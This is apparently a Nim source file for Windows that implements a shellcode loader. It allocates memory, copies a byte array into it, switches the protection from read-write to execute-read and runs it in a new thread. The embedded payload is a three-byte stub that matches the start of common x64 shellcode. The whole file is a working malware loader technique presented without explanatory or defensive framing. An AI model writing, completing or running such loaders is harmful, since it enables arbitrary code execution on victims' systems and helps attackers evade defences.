
import winim/lean, strutils




func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))





proc injectShellcode(shellcode: seq[byte]) =
    let size = shellcode.len
    
    # Allocate RW memory
    let memAddr = VirtualAlloc(
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if memAddr == nil:
        echo "[-] VirtualAlloc failed"
        quit(1)
    
    # Copy shellcode to allocated memory
    copyMem(
        memAddr,
        unsafeAddr shellcode[0],
        size
    )
    
    # Change protection to RX
    var oldProtection: DWORD
    let protectSuccess = VirtualProtect(memAddr, SIZE_T(size), PAGE_EXECUTE_READ, addr oldProtection)
    
    if protectSuccess == 0:
        echo "[-] VirtualProtect failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    # Create thread pointing to shellcode
    var threadId: DWORD
    let hThread = CreateThread(
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](memAddr),
        nil,
        0,
        addr threadId
    )
    
    if hThread == 0:
        echo "[-] CreateThread failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    echo "[+] Executing shellcode via Thread..."
    discard WaitForSingleObject(hThread, INFINITE)
    
    # Cleanup
    discard CloseHandle(hThread)
    discard VirtualFree(memAddr, 0, MEM_RELEASE)


var shellcode: array[3, byte] = [0xfc,0x48,0x83]

proc main() =

    # Convert array to seq for easier handling
    var shellcodeByte = @shellcode
    var finalShellcode = shellcodeByte
    injectShellcode(finalShellcode)


main()
